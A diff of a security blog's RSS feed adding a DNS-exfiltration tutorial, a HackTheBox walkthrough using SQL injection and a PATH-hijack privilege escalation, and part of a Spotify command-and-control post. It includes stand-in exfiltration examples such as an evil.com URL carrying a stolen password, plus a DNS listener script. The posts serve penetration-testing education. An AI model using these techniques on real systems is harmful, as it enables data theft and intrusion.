@@ -12,12 +12,159 @@
     </author>
     
       <item>
+        <title>Setting Up Your Own Malicious DNS Server For Data Exfiltration (Without a DNS Server)</title>
+        <description>&lt;p&gt;Data exfiltration is a key component of any red team/penetration testing assesment. Sometimes it’s as simple as scp’ing the sensitive data over an SSH connection. Other times, however, more sophisticated methods need to be used. One such common method is exfiltrating data through specially crafted URL requests to your public web server, such as placing the sensitive data as a GET parameter (www.evil.com?stolendata=password123). But what if firewall permissions are blocking any outbound HTTP traffic on the victim server? Or has a whitelist of allowed sites and yours isn’t on it (obviously)? Another method is still possible: DNS.&lt;/p&gt;
+
+&lt;p&gt;In this post, I’ll be showing how I set up a public malicious (depending on how you use it) DNS server for exfiltrating data without actually having to run a DNS server ;).&lt;/p&gt;
+
+&lt;h2 id=&quot;what-is-dns-exfiltration&quot;&gt;&lt;a href=&quot;#header-1&quot;&gt;&lt;/a&gt;What Is DNS Exfiltration?&lt;/h2&gt;
+
+&lt;p&gt;The general idea of DNS exfiltration isn’t unsimilar to exfiltrating data through HTTP web requests. Sensitive data is attached to a DNS query that can then be viewed by our malicious DNS server. In this case, the sensitive data is prepended onto the subdomain of our controlled public domain. For example, if we were able to access the password of a user on a victim’s machine, in order to exfil that data, we would have the victim machine make a DNS request for password123.myevildomain.com, with the “password123” being the victim’s password. Since own myevildomain.com, the request to resolve password123 would come to my server. The best part is, I don’t even have to actually respond to the request since I’ve already got what I came for.&lt;/p&gt;
+
+&lt;h2 id=&quot;what-youll-need&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;What You’ll Need&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Public Server you control (I used a digital ocean server)&lt;/li&gt;
+  &lt;li&gt;Public domain name linked to that server&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;setting-up-the-pulbic-domain&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Setting Up The Pulbic Domain&lt;/h2&gt;
+
+&lt;p&gt;The first thing you need is a publicly registered domain. You can do this on a number of sites, but I used godaddy to register john-woodman.com and pointed it to my digitalocean server.&lt;/p&gt;
+
+&lt;h3 id=&quot;creating-a-hostname-for-our-nameserver&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Creating A Hostname For Our Nameserver&lt;/h3&gt;
+&lt;p&gt;Once I registered the domain, I then added my own hostname as a nameserver through godaddy. The reason I had to do this is because nameserver records can’t specify an IP address, it must be a hostname. I made the hostname for the nameserver ns.john-woodman.com and pointed it to my digitalocean server IP.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2020-06-10-DNS-Exfiltration-Setup/1.png&quot; alt=&quot;&quot; height=&quot;100%&quot; width=&quot;100%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;setting-nameservers-to-digitaloceans&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Setting Nameservers To DigitalOcean’s&lt;/h3&gt;
+&lt;p&gt;DigitalOcean actually has the ability to manage DNS records for you. While I could do everything on godaddy or whichever name resolution service you chose, I found DigitalOcean has a nice, simple interface. In godaddy, I set the custom nameservers to DigitalOcean’s so that any DNS requests made to john-woodman.com would go to DigitalOcean.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2020-06-10-DNS-Exfiltration-Setup/2.png&quot; alt=&quot;&quot; height=&quot;100%&quot; width=&quot;100%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now that we have that setup, we can do everything else on DigitalOcean.&lt;/p&gt;
+
+&lt;h3 id=&quot;redirecting-subdomain-requests&quot;&gt;&lt;a href=&quot;#header-6&quot;&gt;&lt;/a&gt;Redirecting Subdomain Requests&lt;/h3&gt;
+&lt;p&gt;I now have to create a few DNS records so that any requests to a specific subdomain will be redirected to my DNS Server instead of being handled by DigitalOcean’s. I first have to create an A record that points all requests to john-woodman.com to my IP (this is mostly to keep my website up and running). I then have to create an A record that points the nameserver domain (ns.john-woodman.com) to my server’s IP. Now, unfortunately, with NS records, I’m not able to specify a wildcard in the subdomain (such as &lt;code class=&quot;highlighter-rouge&quot;&gt;*&lt;/code&gt;.john-woodman.com). From what I can gather, it seems to just not be supported by DNS, with no reason why. Either way, we can get around this by actually just specifying any name for the subdomain, and all subdomain requests sent to that subdomain (subception) will be directed to our DNS server. In my case, I chose a completely random subdomain steve.john-woodman.com. You can call it whatever you want (probably best not to have special characters just to be safe). So when im exfiltrating data, the DNS request would look like for example: password123.steve.john-woodman.com. This is what my DNS configuration looks like on DigitalOcean.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2020-06-10-DNS-Exfiltration-Setup/3.png&quot; alt=&quot;&quot; height=&quot;100%&quot; width=&quot;100%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;setting-up-the-listener&quot;&gt;&lt;a href=&quot;#header-7&quot;&gt;&lt;/a&gt;Setting Up The Listener&lt;/h2&gt;
+&lt;p&gt;The nice part is we don’t actually have to run any DNS service on our server. We can just set up a simple python listener, sift through the data we recieve and grab what we need. Below is the code I wrote to listen on UDP port 53 (DNS requests come in on UDP for the most part).&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;dnslib&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DNSRecord&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_DGRAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'0.0.0.0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;53&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvfrom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DNSRecord&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;questions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_qname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h2 id=&quot;testing-and-exploiting&quot;&gt;&lt;a href=&quot;#header-8&quot;&gt;&lt;/a&gt;Testing and Exploiting&lt;/h2&gt;
+&lt;p&gt;To make sure that it works, I can run a simple nslookup and see if my listener picks up the request.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2020-06-10-DNS-Exfiltration-Setup/4.png&quot; alt=&quot;&quot; height=&quot;80%&quot; width=&quot;80%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The nslookup failed, but thats expected since for one, we don’t actually have any DNS service running, and second, the requested subdomain doesn’t exist. But as you can see, our server did recieve the request and, most importantly, we can see the subdomain.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2020-06-10-DNS-Exfiltration-Setup/5.png&quot; alt=&quot;&quot; height=&quot;75%&quot; width=&quot;75%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;exploiting&quot;&gt;&lt;a href=&quot;#header-9&quot;&gt;&lt;/a&gt;Exploiting&lt;/h2&gt;
+&lt;p&gt;To really fully test our setup, I created a simple vulnerable webserver with a login page connected to a PostgreSQL database that contains login credentials. The webserver is vulnerable to SQL injection, but no output is returned to the user. There’s a few different methods I could use (time-based for example), but why not use DNS exfiltration.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2020-06-10-DNS-Exfiltration-Setup/6.png&quot; alt=&quot;&quot; height=&quot;100%&quot; width=&quot;100%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I won’t go into the exploit itself, but you can read about it &lt;a href=&quot;https://portswigger.net/web-security/sql-injection/blind&quot;&gt;here&lt;/a&gt;. Using Burp, I sent the URL encoded exploit that retrieved the password from the SQL table and sent it as the subdomain in the DNS request.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2020-06-10-DNS-Exfiltration-Setup/7.png&quot; alt=&quot;&quot; height=&quot;100%&quot; width=&quot;100%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;With the listener running on our server, we recieved the DNS request and can see the password that was stored in the PostgreSQL database set as the subdomain!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2020-06-10-DNS-Exfiltration-Setup/8.png&quot; alt=&quot;&quot; height=&quot;75%&quot; width=&quot;75%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#header-10&quot;&gt;&lt;/a&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;The inspiration for this project was trying to run my own server for DNS exfiltration instead of having to pay for the pro version of BurpSuite, which has a BurpCollaborator that will do this for you. I learned a lot more about DNS through this project, and I hope I was able to help you learn something too!&lt;/p&gt;
+</description>
+        <pubDate>Wed, 10 Jun 2020 00:00:00 +0000</pubDate>
+        <link>//posts/DNS-Exfiltration-Setup/</link>
+        <link href="/posts/DNS-Exfiltration-Setup/"/>
+        <guid isPermaLink="true">/posts/DNS-Exfiltration-Setup/</guid>
+      </item>
+    
+      <item>
+        <title>HackTheBox&amp;#58; Writeup</title>
+        <description>&lt;h3 id=&quot;box-type-linux&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Box Type: Linux&lt;/h3&gt;
+&lt;h2 id=&quot;getting-user&quot;&gt;&lt;a href=&quot;#header-1&quot;&gt;&lt;/a&gt;Getting User&lt;/h2&gt;
+&lt;p&gt;Nmap scan showed ports 22 and 80 open.
+&lt;img src=&quot;/assets/2020-5-23-HTB-Writeup/Capture.PNG&quot; alt=&quot;&quot; height=&quot;65%&quot; width=&quot;65%&quot; style=&quot;display: block; margin-right: auto;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Checking out the website shows a notification that some sort of DoS protection is running on the webserver, likely preventing any dictionary or brute force attacks, which means no dirb :(.
+&lt;img src=&quot;/assets/2020-5-23-HTB-Writeup/Capture2.PNG&quot; alt=&quot;&quot; height=&quot;100%&quot; width=&quot;100%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The Nmap scan did show a robots.txt, however:
+&lt;img src=&quot;/assets/2020-5-23-HTB-Writeup/Capture3.PNG&quot; alt=&quot;&quot; height=&quot;60%&quot; width=&quot;60%px&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Navigating to /writeup shows a home page with writeups for other retired boxes:
+&lt;img src=&quot;/assets/2020-5-23-HTB-Writeup/Capture4.PNG&quot; alt=&quot;&quot; height=&quot;90%&quot; width=&quot;90%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Using wappalyzer, it showed that this webpage was running “CMS Made Simple”. Wappalyzer is a useful extension (available for chrome and firefox) which shows what various services, languages, operating system the current website is running.
+&lt;img src=&quot;/assets/2020-5-23-HTB-Writeup/Capture5.PNG&quot; alt=&quot;&quot; height=&quot;60%&quot; width=&quot;60%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;A bit of googling on “CMS Made Simple” showed an &lt;a href=&quot;https://www.exploit-db.com/exploits/46635&quot;&gt;SQL Injection vulnerability&lt;/a&gt;, specifically a blind, time-based injection. Essentially what this means is that we don’t recieve any direct output from the injection (blind), so we have to use sleep functionality (time-based) in SQL along with the substring function to determine the trueness of each guess. Through this, we are able to determine valuable information stored on the machine’s database, including the Password hash, the salt for the password, the username, and the email related to that user. With this, we can crack the hash using either hashcat or johntheripper and a common wordlist (rockyou.txt), but luckily the exploit found on exploitdb does this all for us. All we have to do is specify the url (http://10.10.10.138/writeup) and the wordlist to use.
+&lt;img src=&quot;/assets/2020-5-23-HTB-Writeup/Capture6.PNG&quot; alt=&quot;&quot; height=&quot;60%&quot; width=&quot;60%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We now have the username and password for the user “jkr”. We can SSH in and get the user.txt flag.
+&lt;img src=&quot;/assets/2020-5-23-HTB-Writeup/Capture7.PNG&quot; alt=&quot;&quot; height=&quot;75%&quot; width=&quot;75%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;getting-root&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Getting Root&lt;/h2&gt;
+
+&lt;p&gt;A common script I like to run on any linux box is “pspy”, which shows processes and commands being run in real time. This is useful to see if anything weird is being triggered by doing certain tasks. I used scp to transfer the pspy script over and ran it in one tab. I then opened another SSH connection in another tab to start hopefully triggering some events. Luckily, it was quite easy to find the right event to trigger, since actually SSHing into the box triggered some interesting commands.
+&lt;img src=&quot;/assets/2020-5-23-HTB-Writeup/Capture8.PNG&quot; alt=&quot;&quot; height=&quot;100%&quot; width=&quot;100%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It’s running a command called “run-parts” but it’s specifying it’s own $PATH environment variable. Well let’s check what groups our user is in and what permissions it has on some of these paths:
+&lt;img src=&quot;/assets/2020-5-23-HTB-Writeup/Capture9.PNG&quot; alt=&quot;&quot; height=&quot;60%&quot; width=&quot;60%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As you can see we are in the “staff” group and staff has write permissions on “/usr/local/sbin”, which is the first path specified in the $PATH variable that we saw. Because of this, we can create our own “run-parts” file, have it do whatever we want, place it in /usr/local/sbin and our file will be executed instead of the expected one. This is because Unix will go down the list of the $PATH environment variable until it hits a match. This is what my “run-parts” file looks like:
+&lt;img src=&quot;/assets/2020-5-23-HTB-Writeup/Capture12.PNG&quot; alt=&quot;&quot; height=&quot;60%&quot; width=&quot;60%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Through a little troubleshooting of my own, I was able to figure out that the /root directory didn’t have a .ssh directory, which is why I had it make one in my run-parts file. I then copied by public SSH key over into the root’s authorized_keys file and bam, I can now SSH in as root:
+&lt;img src=&quot;/assets/2020-5-23-HTB-Writeup/Capture11.PNG&quot; alt=&quot;&quot; height=&quot;60%&quot; width=&quot;60%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Overall, this is a really good beginner box, as it points out some common web attacks and enumerations (checking robots.txt and SQL Injection). The priv esc was also a good starter as it points out a simple, yet common vulnerability, which is allowing paths in $PATH to be writable by unauthorized users.&lt;/p&gt;
+
+&lt;p&gt;Hope you enjoyed and learned something :)&lt;/p&gt;
+</description>
+        <pubDate>Sat, 23 May 2020 00:00:00 +0000</pubDate>
+        <link>//posts/HTB-Writeup/</link>
+        <link href="/posts/HTB-Writeup/"/>
+        <guid isPermaLink="true">/posts/HTB-Writeup/</guid>
+      </item>
+    
+      <item>
+        <title>CTF Writeup</title>
+        <description>&lt;p&gt;This is a CTF Writeup&lt;/p&gt;
+</description>
+        <pubDate>Sat, 23 May 2020 00:00:00 +0000</pubDate>
+        <link>//posts/CTF-XSS/</link>
+        <link href="/posts/CTF-XSS/"/>
+        <guid isPermaLink="true">/posts/CTF-XSS/</guid>
+      </item>
+    
+      <item>
         <title>The Most Fun (and maybe impractical) Command and Control: SpotifyC2</title>
         <description>&lt;p&gt;Command and Control is one of the most common techniques used by attackers to maintain persistent control over an infected computer, sending commands to be executed and receiving the output of those commands. There exists many different methods for implementing Command and Control, from using cloud services (AWS, Azure, etc.) to even using social media to send commands. One method we will be exploring is one I haven’t seen before (probably for a good reason): using Spotify to send commands and receive output.&lt;/p&gt;
 
 &lt;h2 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#header-1&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;
 
-&lt;p&gt;This project was inspired by a talk my good friend Terry Thibault (&lt;a href=&quot;https://twitter.com/defnotprobro&quot;&gt;@defnotprobro&lt;/a&gt;) did at BSides Orlando, where he leveraged Twitter as a method for Command and Control.&lt;/p&gt;
+&lt;p&gt;My good friend Terry Thibault (&lt;a href=&quot;https://twitter.com/defnotprobro&quot;&gt;@defnotprobro&lt;/a&gt;) inspired this project, where he presented a talk at BSides Orlando, leveraging Twitter as a method for Command and Control.&lt;/p&gt;
 
 &lt;p&gt;Command and Control essentially functions through a backdoor running on the infected machine, beaconing out every once in a while to retrieve a command or a set of commands to be executed. Commands sent to the beacon are usually encoded or hidden in some way (base64, hidden in an image, etc.) to make it harder for someone to detect. My method uses acrostics in Spotify playlist tracks to send commands, and retrieves output through the description box available in those playlists.&lt;/p&gt;
 
